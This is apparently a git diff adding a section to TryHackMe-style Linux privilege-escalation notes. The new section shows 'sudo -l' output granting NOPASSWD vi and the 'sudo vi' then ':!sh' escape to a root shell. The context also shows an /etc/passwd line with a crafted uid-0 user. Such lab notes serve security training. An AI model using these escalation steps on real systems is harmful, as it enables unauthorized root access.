@@ -83,6 +83,33 @@ thm:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/bin/bash
 # su thm :with the password use added
 ```
 
+### Escaping Vi Editor
+
+use `sudo -l`
+```
+user8@polobox:/home/user3$ sudo -l
+Matching Defaults entries for user8 on polobox:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user8 may run the following commands on polobox:
+(root) NOPASSWD: /usr/bin/vi
+```
+
+search in : https://gtfobins.github.io/
+
+to elevate
+```
+sudo vi
+# once inside type
+:!sh
+# this will pop you a shell
+
+# id 
+uid=0(root)
+```
+
+
 
 ## Linux PrivEsc
 > https://tryhackme.com/room/linuxprivesc
